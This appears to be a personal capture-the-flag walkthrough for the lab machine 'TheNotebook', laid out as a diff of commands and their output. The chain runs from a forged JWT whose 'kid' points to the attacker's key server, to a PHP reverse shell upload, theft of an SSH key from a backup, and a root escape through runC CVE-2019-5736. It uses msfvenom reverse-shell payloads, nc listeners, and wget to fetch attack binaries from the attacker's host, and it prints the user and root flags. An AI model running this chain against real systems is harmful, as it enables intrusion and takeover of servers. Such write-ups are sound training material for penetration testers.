@@ -1,0 +1,244 @@
+Machine-Name : TheNotebook
+IP-Address   : 10.129.127.160
+
+Command-Line: sudo nmap -p- -A -T4 10.129.127.160 -o nmap/init.txt
+Result:
+    ./nmap/init.txt
+
+Command-Line: sudo nmap 10.129.127.160 -p 22,80,10010 -A -T4 -o nmap/vuln.txt --script vuln
+Result:
+    ./nmap/vuln.txt
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt -t 50 -i 200,301,302,403 -u http://10.129.127.160
+Result:
+    ./recon/recon-1.txt
+
+Browser: http://10.129.127.160
+Notes: Registered with credentials username "uk47" and password "uk47" with email "uk47@gmail.com". Signed in. Navigated to notes and noticed the path to notes was also the "uuid". The "auth" value is a jwt token "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6InVrNDcnLS0gLSIsImVtYWlsIjoidWs0NydAZ21haWwuY29tIiwiYWRtaW5fY2FwIjowfQ.fmGBHE--UtpEb9wkMcl_Oxh1OxUup4iMVDKvJyIJpfZFZKlTwdps4y19DF_mzZMmr5FpaHfKH0n91HkFD03ilap57SnWGzaK1RcKMfAqrqaK_DAYF6-K5CacwIt39jJ_nBNsuSMDVzpvJovobEP9HVfhmvgoVoyPytqCM5GlUP_F8NwcaLqPaTczwG1Dz1Wbp2z5rNWJQH8SjQzIJ6tLoCjxFLfnkLApXLIcQlyupPsdbJE_GXGRFpQ3NXNZlpWGBgeQoES6dhVq9y4y6eDnsayZe6lc0fbRmrE7q6vPZQudXkpwL5vHNxiLNgyymQE8_vn9klGQ4aa4gB9ointPf_DDdr-0hSmkHLBWuwKMPP2kwwFNP47UhE6Fu9jvrzcWjuF5OqzfmLahSc2hTxUKt_sF_ucDirDDayjj5DhI5if-6zOugKzgLhR0hejOqtOetK4JW20dNAORcfl1xPCBEtngwKu331W6X0A-Yx-MBGl2CNWcHnE_V6_2cOoy_Lne58LbdgaQY8B6j1M5c4oC5jDH89kWOz3V7fxIv4p4RNK5z1MgcJnMQPNLp07JD3BGH4jQrkHG8ZzwIh13zl3uhp5_Q8T2EWnh_JLIrssek1eBlaW1Aa7AqhBWFFwHrnHAO1CbA0-c_6ZGTwEMsxKXgpG88PnFg4SWRkOQz6Gjf5A"
+
+Notes: Put jwt value into decoder using tool on jwt.io
+Result:
+    HEADER:ALGORITHM & TOKEN TYPE
+    {
+      "typ": "JWT",
+      "alg": "RS256",
+      "kid": "http://localhost:7070/privKey.key"
+    }
+
+    PAYLOAD:DATA
+    {
+      "username": "uk47'-- -",
+      "email": "uk47'@gmail.com",
+      "admin_cap": 0
+    }
+
+    VERIFY SIGNATURE
+    RSASHA256(
+    base64UrlEncode(header) + "." +
+    base64UrlEncode(payload),
+    PUBLIC-KEY-INPUT
+    PRIVATE-KEY-INPUT
+
+Notes: Public and Private keys were found empty. Changing value of "kid" in HEADER to my IP <tun0>.
+
+Command-Line: echo -n eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly9sb2NhbGhvc3Q6NzA3MC9wcml2S2V5LmtleSJ9 |base64 -d
+Result:
+    {
+      "typ": "JWT",
+      "alg": "RS256",
+      "kid": "http://localhost:7070/privKey.key"
+    }
+
+Command-Line: touch jwt.txt
+jwt.txt File-Contents:
+    {
+      "typ": "JWT",
+      "alg": "RS256",
+      "kid": "http://10.10.14.139:7070/privKey.key"
+    }
+
+Command-Line: cat jwt.txt | base64 -w 0
+Result:
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMzk6NzA3MC9wcml2S2V5LmtleSJ9Cg==
+
+Notes: Removed the "==" at the end of the encoding and replaced the first line of the jwt token with "kid" pointing to local IP <tun0>.
+Result:
+    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4xMzk6NzA3MC9wcml2S2V5LmtleSJ9Cg.eyJ1c2VybmFtZSI6InVrNDcnLS0gLSIsImVtYWlsIjoidWs0NydAZ21haWwuY29tIiwiYWRtaW5fY2FwIjowfQ.fmGBHE--UtpEb9wkMcl_Oxh1OxUup4iMVDKvJyIJpfZFZKlTwdps4y19DF_mzZMmr5FpaHfKH0n91HkFD03ilap57SnWGzaK1RcKMfAqrqaK_DAYF6-K5CacwIt39jJ_nBNsuSMDVzpvJovobEP9HVfhmvgoVoyPytqCM5GlUP_F8NwcaLqPaTczwG1Dz1Wbp2z5rNWJQH8SjQzIJ6tLoCjxFLfnkLApXLIcQlyupPsdbJE_GXGRFpQ3NXNZlpWGBgeQoES6dhVq9y4y6eDnsayZe6lc0fbRmrE7q6vPZQudXkpwL5vHNxiLNgyymQE8_vn9klGQ4aa4gB9ointPf_DDdr-0hSmkHLBWuwKMPP2kwwFNP47UhE6Fu9jvrzcWjuF5OqzfmLahSc2hTxUKt_sF_ucDirDDayjj5DhI5if-6zOugKzgLhR0hejOqtOetK4JW20dNAORcfl1xPCBEtngwKu331W6X0A-Yx-MBGl2CNWcHnE_V6_2cOoy_Lne58LbdgaQY8B6j1M5c4oC5jDH89kWOz3V7fxIv4p4RNK5z1MgcJnMQPNLp07JD3BGH4jQrkHG8ZzwIh13zl3uhp5_Q8T2EWnh_JLIrssek1eBlaW1Aa7AqhBWFFwHrnHAO1CbA0-c_6ZGTwEMsxKXgpG88PnFg4SWRkOQz6Gjf5A
+
+Notes: Format is correct, but the token still requires a "public" and "private" key.
+
+Command-Line: cd www
+Command-Line(./www): sudo python3 -m http.server --bind 10.10.14.139 7070
+Result:
+    Serving HTTP on 10.10.14.139 port 7070 (http://10.10.14.139:7070/) ...
+    10.129.127.160 - - [23/Aug/2021 10:03:13] "GET /rev-shell.php HTTP/1.1" 200 -
+    10.129.127.160 - - [23/Aug/2021 10:03:43] "GET /rev-shell.php HTTP/1.1" 200 -
+
+Notes: The jwt token is reaching out to our IP address and requesting the file ./www/rev-shell.php . It is possible to now sign our own jwt token.
+
+Command-Line: ssh-keygen -t rsa -m PEM -b 4096 -f privKey.key
+Result:
+    ./www/.ssh/privKey.key
+    ./www/.ssh/privKey.key.pub
+
+Notes: Public key is in SSH id_rsa format and needs to be converted to a certificate.
+Command-Line(./www/.ssh): openssl rsa -in privKey.key -pubout -outform PEM -out privKey.key.pub
+Result:
+    ...writing RSA key
+
+Notes: Copied Private and Public keys into jwt.io engine. Changed "admin_cap" to "1".
+Result:
+   Signature Verified
+
+JWT Token:
+    ./jwt.token
+
+Notes: Replaced jwt "auth" token in the Browser cookie "storage". An "Admin Panel" was revealed. Clicking on the link, I am brought to a page with "View Notes" and "Upload File".
+
+View-Notes:
+Result:
+    Need to fix config
+    admin
+
+    Have to fix this issue where PHP files are being executed :/. This can be a potential security issue for the server.
+
+    ----------------------------------------------------------------------------
+
+    Backups are scheduled
+    admin
+
+    Finally! Regular backups are necessary. Thank god it's all easy on server.
+
+    ----------------------------------------------------------------------------
+
+    The Notebook Quotes
+    noah
+
+    "I am nothing special, of this I am sure. I am a common man with common thoughts and I've led a common life. There are no monuments dedicated to me and my name will soon be forgotten, but I've loved another with all my heart and soul, and to me, this has always been enough.." ― Nicholas Sparks, The Notebook "So it's not gonna be easy. It's going to be really hard; we're gonna have to work at this everyday, but I want to do that because I want you. I want all of you, forever, everyday. You and me... everyday." ― Nicholas Sparks, The Notebook "You can't live your life for other people. You've got to do what's right for you, even if it hurts some people you love." ― Nicholas Sparks, The Notebook "You are, and always have been, my dream." ― Nicholas Sparks, The Notebook "You are my best friend as well as my lover, and I do not know which side of you I enjoy the most. I treasure each side, just as I have treasured our life together." ― Nicholas Sparks, The Notebook "I love you. I am who I am because of you. You are every reason, every hope, and every dream I've ever had, and no matter what happens to us in the future, everyday we are together is the greatest day of my life. I will always be yours. " ― Nicholas Sparks, The Notebook "We fell in love, despite our differences, and once we did, something rare and beautiful was created. For me, love like that has only happened once, and that's why every minute we spent together has been seared in my memory. I'll never forget a single moment of it." ― Nicholas Sparks, The Notebook
+
+    ----------------------------------------------------------------------------
+
+    Is my data safe?
+    noah
+
+    I wonder is the admin good enough to trust my data with?
+
+Command-Line(./www/): cp /usr/share/laudanum/php/php-reverse-shell.php .
+Command-Line: mv php-reverse-shell.php rev-shell.php
+Result:
+    ./www/rev-shell.php
+Notes: Noticed that php execution is a concern. Clicking into "Upload Files" and uploading "./www/rev-shell.php".
+Result:
+    e3a20b06d47c9626f41f9c72c4f64a6a.php
+Command-Line: nc -lvnp 9001
+Browser: http://10.129.127.160/e3a20b06d47c9626f41f9c72c4f64a6a.php
+Result:
+    *** REVERSE SHELL ***
+    www-data@thenotebook:/$
+Notes: After enumerating through different directories, I found /var/backups/home.tar.gz
+www-data@thenotebook:/var/backups$ cp home.tar.gz /dev/shm
+www-data@thenotebook:/dev/shm$ tar -xvzf home.tar.gz
+Result:
+    home/
+    home/noah/
+    home/noah/.bash_logout
+    home/noah/.cache/
+    home/noah/.cache/motd.legal-displayed
+    home/noah/.gnupg/
+    home/noah/.gnupg/private-keys-v1.d/
+    home/noah/.bashrc
+    home/noah/.profile
+    home/noah/.ssh/
+    home/noah/.ssh/id_rsa
+    home/noah/.ssh/authorized_keys
+    home/noah/.ssh/id_rsa.pub
+
+Notes: Able to SSH into "noah".
+
+www-data@thenotebook:/dev/shm$ cat home/noah/.ssh/id_rsa
+Result:
+    ./www/noah/noah.key
+
+Command-Line: ssh -i noah.key noah@10.129.127.160
+Result:
+    *** USER ACCESS ***
+    noah@thenotebook:~$
+
+noah@thenotebook:~$ cat user.txt
+Result:
+    efc5dc535e04cd741b1d8a99c24eeff7
+    *** USER OWNED ***
+
+noah@thenotebook:/$ sudo -l
+Result:
+    Matching Defaults entries for noah on thenotebook:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User noah may run the following commands on thenotebook:
+        (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
+
+noah@thenotebook:/$ docker -v
+Result:
+    Docker version 18.06.0-ce, build 0ffa825
+
+Browser: CVE Docker
+URL: https://www.cvedetails.com/vulnerability-list/vendor_id-13534/product_id-28125/Docker-Docker.html
+IMAGE: ./docker_CVE_details.png
+Notes: Found known vulnerability.
+Exploit: CVE-2019-5736
+
+Browser: CVE-2019-5736 github
+URL: https://github.com/twistlock/RunC-CVE-2019-5736
+
+Command-Line(~/HackingTools): git clone https://github.com/twistlock/RunC-CVE-2019-5736.git
+Command-Line(~/HackingTools/RunC-CVE-2019-5736/exec_POC): msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.139 LPORT=9001 -f elf -o new_runc
+Command-Line: nc -lvnp 9001
+Command-Line(~/HackingTools/RunC-CVE-2019-5736/exec_POC): ./new_runc
+Result:
+    listening on [any] 9001 ...
+    connect to [10.10.14.139] from (UNKNOWN) [10.10.14.139] 50356
+
+noah@thenotebook:/$ sudo /usr/bin/docker exec -it webapp-dev01 sh
+Result:
+    #
+
+# python3 -c 'import pty;pty.spawn("/bin/bash")'
+Result:
+    root@0f4c2517af40:/opt/webapp#
+Notes: Inside a docker container.
+
+root@0f4c2517af40:/opt/webapp# exit
+Result:
+    #
+
+Command-Line(~/HackingTools/RunC-CVE-2019-5736/exec_POC): sudo python3 -m http.server --bind 10.10.14.139 8000
+Command-Line: nc -lvnp 9001
+
+# cd /
+# for f in bash_evil replace.sh overwrite_runc new_runc ; do wget 10.10.14.139:8000/$f ; done
+# chmod 777 replace.sh bash_evil new_runc overwrite_runc
+# cp /bin/bash /bin/bash_original
+# cp bash_evil /bin/bash
+# ./replace.sh
+Result:
+    [+] Waiting for runC to be executed in the container...
+
+Command-Line(./www/noah): ssh -i
+noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 sh
+Result:
+    [+] Got /proc/7338/exe as fd 3 in this process
+    [+] Opened runC (using /proc/self/fd/3) for writing
+    [+] Succesfully overwritten runC
+    [+] Done, shuting down ..
+
+    LOCAL-RESPONSE(9001):
+        listening on [any] 9001 ...
+        connect to [10.10.14.139] from (UNKNOWN) [10.129.127.160] 47080
+        whoami
+        root
+        cat /root/root.txt
+        0abdcf8734f7f6a74504b568b669a134
+    *** ROOT ACCESS ***
+    *** ROOT OWNED ***
+
+      *** FINISHED ***
